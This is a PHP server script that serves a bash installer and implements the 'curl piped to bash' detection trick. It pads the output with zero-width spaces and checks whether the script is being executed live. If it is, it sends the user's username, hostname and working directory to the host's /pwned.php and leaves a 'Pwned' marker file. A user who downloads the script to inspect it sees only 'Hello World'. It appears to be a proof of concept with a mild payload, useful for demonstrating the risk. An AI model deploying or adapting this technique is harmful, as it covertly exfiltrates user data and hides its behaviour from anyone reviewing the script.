<?
header('Content-Type: text/plain; charset=UTF-8');

$baseurl = ($_SERVER['REQUEST_SCHEME'] == 'http' ? 'http://' : 'https://') . $_SERVER['HTTP_HOST'];

$id = uniqid();
?>
#!/bin/bash
curl -L <?=$baseurl; ?>/download/<?=$id;?>.tar.gz -o download.tar.gz
<?
flush(); 
$startTime = time();
// Fill buffer until time out or curl was executed
while ((time() < $startTime +1) && !file_exists($id)) {
    // Send Zero white space - unicode char
    // Not visible in bash and most editors.
    echo "\u{200B}"; 
    flush();
}
// Check if $id was detected or we time out
if (file_exists($id)) {
?>
curl -s -G \
    --data-urlencode "username=$(whoami)" \
    --data-urlencode "hostname=$(hostname)" \
    --data-urlencode "&pwd=$(pwd)" \
    "<?= $baseurl ?>/pwned.php" &> /dev/null
echo "!!! Pwned !!!" > ~/pwned.txt
echo "Take a look at <?= $baseurl ?>/pwned.txt" >> ~/pwned.txt
echo "!!! Pwned !!!"
echo "Take a look at ~/pwned.txt in your home folder."

<? } else { ?>

echo "Hello World!"
<?}
